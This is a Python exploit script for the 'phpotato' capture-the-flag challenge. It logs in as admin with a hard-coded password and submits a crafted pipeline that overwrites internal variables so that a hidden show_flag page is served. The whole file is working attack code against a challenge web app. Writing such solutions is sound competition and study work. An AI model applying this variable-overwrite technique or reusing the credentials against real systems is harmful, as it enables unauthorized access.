# flag.py
import requests
import re

requests.packages.urllib3.disable_warnings()

s = requests.session()
# s.proxies = {
#     "http": "http://127.0.0.1:8080",
#     "https": "http://127.0.0.1:8080",
# }
s.verify = False

USERNAME = "admin"
# PASSWORD = "REDACTED"
PASSWORD = "w4GNskGHWrfmodOhtc04dphIttnBhEcT"

BASE_URL = "http://localhost:5003"
# BASE_URL = "https://phpotato.snakectf.org"


def login():
    s.post(
        f"{BASE_URL}/login",
        data={
            "_METHOD": "POST",
            "username": USERNAME,
            "password": PASSWORD,
            "login": "Login",
        },
        allow_redirects=False,
    )


def main():
    login()

    pipeline = """\
    $pages = $user_hooks
    $req_page = $precision
    $req_method = 1
    """

    s.post(
        f"{BASE_URL}/admin",
        data={"_METHOD": "PUT", "pipeline": pipeline, "submit": "Create"},
    )

    # extract pipeline id
    res = s.get(f"{BASE_URL}/admin")
    m = re.findall(r"hidden value=([0-9]+)", res.text)
    if not m:
        print("not matched.")
        return

    pipeline_id = max(m)

    s.post(
        f"{BASE_URL}/admin",
        data={"_METHOD": "POST", "id": pipeline_id, "submit": "Process"},
    )
    res = s.get(f"{BASE_URL}/admin/p-show_flag")
    print(res.text)


if __name__ == "__main__":
    main()
